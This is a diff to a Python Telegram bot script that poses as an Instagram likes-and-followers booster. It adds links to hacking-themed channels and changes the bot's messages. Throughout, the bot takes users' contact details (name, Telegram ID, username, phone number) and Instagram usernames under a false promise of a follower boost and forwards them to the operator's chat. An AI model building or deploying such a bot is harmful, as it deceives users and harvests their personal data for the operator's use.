@@ -15,18 +15,18 @@ def create_custom_keyboard(user_id):
     markup = types.InlineKeyboardMarkup()
     
     # Row 1: Join Channel 1 and Join Channel 2 buttons
-    join_channel1_button = types.InlineKeyboardButton("Join Channel 1", url="https://t.me/channel1_username_or_link")
-    join_channel2_button = types.InlineKeyboardButton("Join Channel 2", url="https://t.me/channel2_username_or_link")
+    join_channel1_button = types.InlineKeyboardButton("Join Channel 1", url="https://t.me/onlinehacking")
+    join_channel2_button = types.InlineKeyboardButton("Join Channel 2", url="https://t.me/termuxhacktutorial")
     markup.row(join_channel1_button, join_channel2_button)
     
     # Row 2: Check button
-    check_button_text = "Welcome to the bot!" if click_count.get(user_id, 0) % 2 == 1 else "Check"
+    check_button_text = "Welcome to the bot!" if click_count.get(user_id, 0) % 2 == 1 else "✅ Check"
     check_button = types.InlineKeyboardButton(check_button_text, callback_data="check_button")
     markup.row(check_button)
     
     return markup
 
-bot.send_message(ID, 'Click the buttons below:', reply_markup=create_custom_keyboard(ID))
+bot.send_message(ID, '⚠️ In use this bot you have to join our telegram channel./n/nAfter successful joining 2 telegram channel click check button ✅', reply_markup=create_custom_keyboard(ID))
 print("\n\n\033[91m[\033[92m*\033[91m]\033[93m Bot Launched! \033[96m >>> \033[0m\n\n")
 
 # Handler for the "Check" button click
@@ -35,16 +35,16 @@ def handle_check_button_click(call):
     user_id = call.message.chat.id
     click_count[user_id] = click_count.get(user_id, 0) + 1
     if click_count[user_id] % 2 == 1:
-        bot.send_message(user_id, "You clicked the 'Check' button!")
+        bot.send_message(user_id, "⚠️ If you have not joined our Telegram channel, Join again and check!")
     else:
-        bot.send_message(user_id, "Welcome to the bot!")
+        bot.send_message(user_id, "✅ Your Bot has become star now you can share username!")
 
 @bot.message_handler(commands=['start'])
 def start(message):
 	bot.send_message(message.chat.id, '''👋 Hello! 👋
 This is a bot for getting likes and subscribers on Instagram!
 To start, write /getfollowers''') 
-@bot.message_handler(commands=['OnlineHacking'])
+@bot.message_handler(commands=['admin'])
 def start(message):
 	bot.send_message(message.chat.id, 'Author of the script:: @suman333mondal. Check: t.me/onlinehacking') 
 @bot.message_handler(commands=['getfollowers'])
@@ -106,8 +106,8 @@ def proc2(message):
 		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
 		button_phone = types.KeyboardButton(text="Register", request_contact=True) 	
 		keyboard.add(button_phone)	
-		bot.send_message(m_id, '''Looks like you have no free requests left for the day!
-To receive additional requests, register in the bot!''', reply_markup=keyboard)
+		bot.send_message(m_id, '''Looks Like You Have no Free Requests Left for the Day!
+To Receive Additional Requests, Register in the Bot!''', reply_markup=keyboard)
 
 	except Exception as e:
 		bot.send_message(ID, e)
@@ -125,10 +125,10 @@ def contact(message):
 			Data
 			├Name: {first} {last}
 			├ID: {userid}
-			├Nick: @{nick}
+			├Username: @{nick}
 			└Phone number: {phone}
    
-      🎭 Follow @OnlineHacking for more...
+🎭 Follow @OnlineHacking for more...
       '''
 
 		bot.send_message(ID, info)
@@ -142,7 +142,7 @@ def contact(message):
 			bot.send_message(message.chat.id, 'Submit your contact!')
 		bot.send_message(message.chat.id, 'Registration Completed Successfully!') 
 		time.sleep(1)
-		msg = bot.send_message(message.chat.id, 'Enter your Instagram Nickname:') 
+		msg = bot.send_message(message.chat.id, 'Enter Your Instagram Username:') 
 		bot.register_next_step_handler(msg, entr)
 
 def entr(message):
@@ -150,8 +150,8 @@ def entr(message):
 		inp = message.text
 		m_id = message.chat.id
 
-		bot.reply_to(message, f'Nick: {inp} ')#⏳
-		bot.send_message(ID, f'Nick on Instagram: {inp}')
+		bot.reply_to(message, f'Instagram Username: {inp} ')#⏳
+		bot.send_message(ID, f'User Instagram Username: {inp}')
 		bot.send_message(message.chat.id, 'Expect a boost to your account within 24 hours!')
 	except Exception as e:
 		bot.send_message(ID, e)
